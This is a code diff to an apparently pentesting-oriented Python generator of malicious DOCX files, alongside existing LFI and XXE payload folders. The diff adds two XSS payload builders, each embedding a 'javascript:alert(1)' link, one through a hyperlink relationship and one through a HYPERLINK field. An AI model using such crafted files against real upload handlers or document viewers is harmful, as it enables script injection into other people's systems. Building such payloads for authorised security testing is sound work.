@@ -15,6 +15,8 @@ def generate_docx_payloads(output_dir, burp_collab):
     lfi_dir.mkdir(exist_ok=True)
     xxe_dir = output_dir / 'xxe'
     xxe_dir.mkdir(exist_ok=True)
+    xss_dir = output_dir / 'xss'
+    xss_dir.mkdir(exist_ok=True)
     
     def create_docx_with_rels(docx_path, rels_content, rels_path="word/_rels/document.xml.rels"):
         doc = Document()
@@ -207,6 +209,89 @@ def generate_docx_payloads(output_dir, burp_collab):
             if file_path.is_file():
                 arcname = file_path.relative_to(temp_dir)
                 zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    doc = Document()
+    doc.add_paragraph('Test')
+    docx_path = xss_dir / "xss1_hyperlink_js.docx"
+    doc.save(docx_path)
+    
+    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_xss1"
+        zip_ref.extractall(temp_dir)
+    
+    document_xml_path = temp_dir / "word" / "document.xml"
+    if document_xml_path.exists():
+        tree = ET.parse(document_xml_path)
+        root = tree.getroot()
+        
+        ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
+              'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'}
+        
+        for p in root.findall('.//w:p', ns):
+            r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
+            hyperlink = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}hyperlink')
+            hyperlink.set('{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id', 'rIdXSS1')
+            t = ET.SubElement(hyperlink, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
+            t.text = 'click'
+            break
+        
+        tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
+        
+        rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
+        rels_tree = ET.parse(rels_path)
+        rels_root = rels_tree.getroot()
+        
+        rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
+        rel.set('Id', 'rIdXSS1')
+        rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink')
+        rel.set('Target', 'javascript:alert(1)')
+        rel.set('TargetMode', 'External')
+        
+        rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    doc = Document()
+    doc.add_paragraph('Test')
+    docx_path = xss_dir / "xss2_field_hyperlink_js.docx"
+    doc.save(docx_path)
+    
+    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_xss2"
+        zip_ref.extractall(temp_dir)
+    
+    document_xml_path = temp_dir / "word" / "document.xml"
+    if document_xml_path.exists():
+        tree = ET.parse(document_xml_path)
+        root = tree.getroot()
+        
+        ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'}
+        
+        for p in root.findall('.//w:p', ns):
+            r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
+            fldChar = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldChar')
+            fldChar.set('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldCharType', 'begin')
+            instrText = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}instrText')
+            instrText.text = ' HYPERLINK "javascript:alert(1)" '
+            fldChar2 = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldChar')
+            fldChar2.set('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldCharType', 'end')
+            break
+        
+        tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
     
     shutil.rmtree(temp_dir, ignore_errors=True)
     
